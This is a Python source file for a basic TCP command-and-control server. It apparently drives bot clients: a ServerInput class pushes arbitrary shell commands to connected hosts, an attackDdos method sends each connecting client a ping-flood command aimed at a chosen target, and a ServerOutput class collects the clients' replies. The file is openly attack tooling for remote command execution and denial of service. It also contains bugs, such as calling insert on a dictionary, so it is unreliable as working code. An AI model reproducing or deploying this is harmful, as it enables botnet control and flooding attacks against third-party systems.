import socket
from _dbus_bindings import Message

class Server:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port  

    def run(self):
        self.connections = {}
        print(str(self.ip) + " " + str(self.port))
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
        # Bind the socket to the port
        server_address = (self.ip, self.port)
        sock.bind(server_address)        
        # Listen for incoming connections
        sock.listen(1000)        
        while True:
            # Wait for a connection
            connection, client_address = sock.accept()            
            try:
                self.connections.insert(client_address, connection)
                self.runSpecific(connection)                              
            finally:
                # Clean up the connection
                connection.close()
                
    def getIpsConnections(self):
        return self.connections.keys()

class ServerOutput(Server):
            
    def runSpecific(self, connection):
        data = connection.recv(160000).decode("utf-8")
        print(data)
    
class ServerInput(Server):
    
    def setMessage(self, message):
        self.message = message
        
    def attackDdos(self,canonicalName,packageWeight):
        self.setMessage("ping "+ canonicalName + " -t -1 " + packageWeight)
        self.run()
    
    def conectWithOneConnection(self,key,command):
        connection = self.connections.get(key) 
        self.setMessage(command)
        self.runSpecific(connection)
    
    def runSpecific(self, connection):
        connection.sendall((bytes(self.message, "utf-8")))
